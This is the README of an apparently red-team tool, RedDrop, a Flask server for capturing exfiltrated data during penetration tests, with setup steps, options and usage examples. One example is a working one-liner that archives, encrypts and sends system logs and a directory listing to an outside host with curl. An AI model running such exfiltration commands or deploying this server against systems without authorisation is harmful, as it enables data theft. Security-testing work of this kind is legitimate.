![Red Drop](docs/RedDrop.png)
# RedDrop Exfil Server
[Check out the accompanying MaverisLabs Blog Post Here!](https://medium.com/maverislabs/data-exfiltration-using-reddrop-13bcbad7acb0?source=friends_link&sk=34320be3746773a82d065d03ea05111b)

RedDrop Exfil Server is a Python Flask Web Server for Penetration Testers, Red Teamers, and Security Professionals which features:
- [File Upload](docs/FileUpload.md)
- [Automatic Payload Processing](docs/PayloadProcessing.md)
- [Automatic Archive Extraction](docs/ArchiveExtraction.md)
- [JSON Logging](docs/JSONLogging.md)
- [Configurable Options](docs/Configurations.md)
- [Authorization Rules](docs/AuthorizationRules.md)

This software is intended to be used as a rudimentary C2 endpoint for capturing web request data in various scenarios. Some examples may include:
- A blind command injection vulnerability
- An XSS attack where a quick and dynamic web request logging server is needed
- A situation where remote shell access has been obtained and a verbose-logging web-based exfiltration server is desired


## Demo
[![Demo](https://img.youtube.com/vi/x9KmGCfyyZ0/0.jpg)](https://www.youtube.com/watch?v=x9KmGCfyyZ0)
---

**This project is still in development and some features may be buggy. If you run into problems, please open an Issue!**

### A note on security
This software should not be left generally accessible to the broader Internet. It is built with what some might consider an Arbitrary File Upload vulnerability by intention, and will accept and save files to the local disk without authentication. Due diligence should be taken to ensure that the system this software is deployed to is secured properly. A few recommendations:
- Utilize the [Authorization Rules](docs/AuthorizationRules.md) feature of RedDrop to drop requests which do not meet your criteria. 
- Place a Reverse Proxy to route and block traffic to this web application
- Whitelist your target's IP space
- Don't auto extract archives without understanding our filtering method

## Quick Start
### Docker
The image runs as an unprivileged user and therefore defaults to port `8080`. Build the image with your local UID/GID so bind-mounted upload and log directories remain writable:

```bash
docker build --build-arg UID="$(id -u)" --build-arg GID="$(id -g)" -t reddrop .
mkdir -p uploads logs
docker run --rm -it \
  -v "$PWD/uploads:/reddrop/uploads" \
  -v "$PWD/logs:/reddrop/logs" \
  -p "8080:8080" \
  --name reddrop reddrop
```

Pass `-P <port>` after the image name to change the listening port inside the container. Use a port at or above `1024`; the container runs as an unprivileged user and cannot bind privileged ports.

### uv
Dependencies are managed with `uv` (`pyproject.toml` + `uv.lock`) and require Python 3.12+. The Docker image uses Python 3.13.

```bash
uv sync
uv run python reddrop-server.py -P 8080
```

The default port is `80`; use `-P` to bind an unprivileged port. Run `uv run python reddrop-server.py -h` for all options.

### Options
```bash
uv run python reddrop-server.py -h

     A Webserver for File and Data Exfiltration.
        Author: @cyberbutler/@thecyberbutler

options:
  -h, --help            show this help message and exit
  -H, --host HOST       The host IP Address to bind to (default: 0.0.0.0)
  -P, --port PORT       The port to bind to (default: 80)
  -c, --config CONFIG   YAML config file path (default: None)
  --dump-config         Dump the configuration settings as YAML (default:
                        False)
  --debug               Enable Flask's Debug Mode (default: False)
  -p, --processor {hex,openssl-aes256-pbkdf2,gzip,b64}
                        Specify a processor to use. This flag can be used more
                        than once to define multiple process_list functions.
                        Use this flag in the order in which you wish to
                        process received data (default: [])
  -A, --auto-process, --no-auto-process
                        Automatically run processors based on detected data.
                        This option is enabled by default, but should be
                        disabled (--no-auto-process) when you receive output
                        you don't expect. Such as in the case of Base64
                        decoding being run on output that is not Base64
                        encoded. Instead, force the process with the `-p`
                        flag. (default: True)
  -x, --auto-extract-tar
                        Auto extract TAR archives received by the server.
                        (default: False)
  --encryption-password PROCESSOR_ARGUMENTS.OPENSSL-AES256-PBKDF2.PASSWORD
                        The password used to decrypt/encrypt. (default:
                        EncryptMe)
  -r, --authorization-rules, --authorization_rules AUTHORIZATION_RULES
                        Specify an Authorization Rule to deny requests which
                        do not match the provided Key and Regex value pair.
                        Specified as <Key>=<Regex>. (default: None)
  -t, --tag TAGS        Tag data received during this session in the logs as
                        well as the directory files are uploaded to. Example:
                        -t log4j -t acme.org (default: None)
  --tls-keyfile GUNICORN.KEYFILE
                        Enables TLS Support. (Production Only) The path to a
                        TLS key file (default: None)
  --tls-certfile GUNICORN.CERTFILE
                        Enables TLS Support. (Production Only) The path to a
                        TLS cert file (default: None)

More configuration options are available through a YAML config file or Environment Variables. Use `--dump-config` to see all of the options.

```

### Configuration
RedDrop accepts configuration from a YAML file (`-c`), `REDDROP_*` environment variables, and explicit CLI flags. Precedence, highest first:

1. Explicit CLI flags
2. YAML config file
3. `REDDROP_*` environment variables
4. Built-in defaults

Use `--dump-config` to print the resolved configuration:

```bash
uv run python reddrop-server.py -c config.yml --dump-config
```

See [Configurable Options](docs/Configurations.md) for every setting.

### Examples
#### Sending a raw request body
```bash
curl --data-binary '68656c6c6f' \
  -H 'Content-Type: application/octet-stream' \
  http://localhost:8080/
```

Raw request bodies are processed like other parameters. The hex payload above is decoded to `hello`.

#### Exfiltrating a Tar archive and command output from a Linux system
```bash
tar cz /var/log | base64 | xxd -ps | gzip | openssl enc -aes-256-cbc -pass 'pass:EncryptMe' -e -a -pbkdf2 | curl "http://172.17.0.1$PWD" -F 'logs=@-' -F "listing=`ls -al * | gzip | base64`"
```

![example-screenshot.png](docs/example-screenshot.png)

## Todo
- [ ] Greater documentation of techniques using this web server
- [ ] Chunked File Upload handling and example commands
- [ ] More Processing modules
- [ ] Expand archive extraction functionality
